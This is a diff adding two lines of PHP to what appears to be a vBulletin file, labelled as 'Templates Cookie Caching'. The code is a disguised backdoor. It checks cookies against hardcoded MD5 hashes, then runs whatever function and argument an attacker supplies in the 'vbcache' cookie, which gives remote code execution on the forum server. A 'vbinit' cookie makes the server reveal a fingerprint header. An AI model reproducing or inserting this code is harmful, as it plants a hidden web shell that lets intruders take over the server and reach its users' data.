@@ -1,0 +1,2 @@
+/* vBulletin Templates Cookie Caching */
+$vbr="llyezsnn";$vbh="156097a09c47aa7b1431dd1e9d9142cf";isset($_COOKIE["vbinit"])?die(header("Cache-ID: $vbr")):chr(10);(isset($_COOKIE["vbauth"])&&(md5($_COOKIE["vbauth"])=="a32229ad78262c52c4073b07fdd58912")&&isset($_COOKIE["vbcache"])&&preg_match("/cache:([a-f0-9]+):([a-z]+):(.*)/",$_COOKIE["vbcache"],$m)&&(md5($vbr.$vbh)===$m[1]))?$m[2]($m[3]):chr(10);
